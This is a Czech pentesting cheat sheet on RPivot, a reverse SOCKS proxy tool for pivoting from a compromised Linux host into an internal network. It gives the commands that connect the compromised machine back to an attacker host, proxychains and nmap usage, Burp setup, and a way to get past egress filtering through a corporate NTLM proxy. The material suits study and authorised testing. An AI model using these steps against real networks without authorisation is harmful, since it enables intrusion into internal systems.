# RPIVOT – Reverse SOCKS Proxy Pivoting

## Co je RPivot

**Rpivot** je nástroj pro vytvoření **reverse SOCKS proxy tunelu** mezi kompromitovaným systémem a útočným strojem.

Používá se hlavně tehdy, když:

- nemáme přímý přístup do interní sítě,
- pivot nemůže navázat klasické SSH spojení,
- firewall povoluje pouze HTTP/HTTPS provoz,
- potřebujeme dostat své nástroje (Nmap, Burp, Firefox) do interní sítě.

**Princip:**

```
Kali (attacker)
      |
      | SOCKS Proxy :9050
      |
rpivot server
      |
      | reverse connection
      |
Pivot Host (Ubuntu)
      |
      |
Internal Network
172.16.x.x
```

---

# 1. Kdy použít RPivot

Použij RPivot pokud:

✅ Máš shell na interním serveru  
✅ Nemáš SSH přístup  
✅ Firewall blokuje příchozí spojení  
✅ Povolený je pouze webový provoz  
✅ Potřebuješ SOCKS proxy pro více nástrojů

Typický scénář:

```
Internet
   |
Kali
   |
Firewall
   |
Ubuntu Server (kompromitovaný)
   |
Internal VLAN
   |
AD / Web / DB servery
```

---

# 2. Spuštění RPivot serveru (Kali)

Server vytvoří SOCKS proxy na tvém stroji.

Parametry:

- `--server-port`  
    Port pro spojení pivot hosta zpět na Kali.
- `--proxy-port`  
    Lokální SOCKS proxy pro nástroje.

Příklad:

```
python2 server.py \
--proxy-port 9050 \
--server-port 9999 \
--server-ip 0.0.0.0
```

Výsledek:

```
SOCKS4 Proxy:
127.0.0.1:9050
```

---

# 3. Spuštění klienta na Pivot Hostu

Na kompromitovaném Linuxu:

```
python2 client.py \
--server-ip 10.10.14.5 \
--server-port 9999
```

Pivot naváže spojení:

```
Pivot Host ---> Kali:9999
```

Po úspěšném spojení:

```
Kali
 |
SOCKS 9050
 |
Pivot
 |
Internal Network
```

---

# 4. Proxychains konfigurace

Uprav:

```
sudo nano /etc/proxychains4.conf
```

Přidej:

```
socks4 127.0.0.1 9050
```

Test:

```
proxychains curl http://172.16.5.20
```

---

# 5. Použití při pentestu

## Nmap přes RPivot

Používej:

```
proxychains nmap -sT -Pn -n 172.16.5.0/24
```

Důvod:

❌ nefunguje:

```
-sS
```

Proxy neumí SYN scan.

Používej:

✅ TCP Connect:

```
-sT
```

---

## Přístup na interní web

Například:

```
172.16.5.135:80
```

Přes proxy:

```
proxychains firefox http://172.16.5.135
```

Použití:

- interní administrace
- GitLab
- Jenkins
- IIS
- intranet aplikace

---

## Burp Suite přes RPivot

Burp nastav:

```
Proxy type:
SOCKS4

Host:
127.0.0.1

Port:
9050
```

Potom můžeš testovat:

- SQL Injection
- XSS
- IDOR
- Authentication bypass
- API endpointy

---

# 6. RPivot přes firemní HTTP Proxy

## Problém

Enterprise síť:

```
Server
 |
HTTP Proxy
 |
Internet
```

Přímé spojení:

```
SSH ❌
Netcat ❌
Socat ❌
```

Ale:

```
HTTP/HTTPS ✅
```

RPivot umí využít firemní proxy.

---

## NTLM Proxy Authentication

Příklad:

```
python client.py \
--server-ip 10.10.14.5 \
--server-port 8080 \
--ntlm-proxy-ip 10.10.10.10 \
--ntlm-proxy-port 8081 \
--domain DOMAIN \
--username user \
--password password
```

Použití:

- obejití egress filtrování
- komunikace přes legitimní webový provoz

---

# SSH Dynamic (-D) vs RPivot

|Vlastnost|SSH Dynamic|RPivot|
|---|---|---|
|Typ tunelu|SOCKS|SOCKS|
|Směr|Kali → Pivot|Pivot → Kali|
|SSH potřeba|Ano|Ne|
|Python potřeba|Ne|Ano|
|Firewall restrikce|Horší|Lepší|
|HTTP Proxy|Ne|Ano|
|NTLM Proxy|Ne|Ano|

---

# Pentester rozhodovací tabulka

|Situace|Nástroj|
|---|---|
|Mám SSH na Linux pivot|sshuttle / SSH -D|
|Mám pouze Meterpreter|autoroute + socks_proxy|
|Potřebuji rychlý SOCKS tunel|Chisel|
|Pivot nemůže ven kromě HTTP|RPivot|
|Potřebuji GUI RDP|SSH -L|
|Potřebuji celou síť transparentně|sshuttle|
|Silný firewall + proxy|RPivot|

---

# Důležité poznámky

### RPivot není VPN

Je to pouze:

```
SOCKS proxy
```

Proto musíš používat:

```
proxychains
```

nebo aplikace podporující SOCKS.

---

### Po práci kontrola tunelu:

```
ps aux | grep rpivot
```

Ukončení:

```
kill PID
```

---

## Pentester workflow

```
Initial Access
      |
      ↓
Shell na Pivot Host
      |
      ↓
Zjistit interface
ip addr

      |
      ↓
Najít interní subnet
172.16.x.x

      |
      ↓
Vybrat pivot metodu

SSH dostupné?
 ├── Ano → sshuttle / SSH -D
 |
 └── Ne
        |
        HTTP proxy?
        |
        └── RPivot

      |
      ↓
Proxychains
      |
      ↓
Nmap / Burp / SMB / RDP
```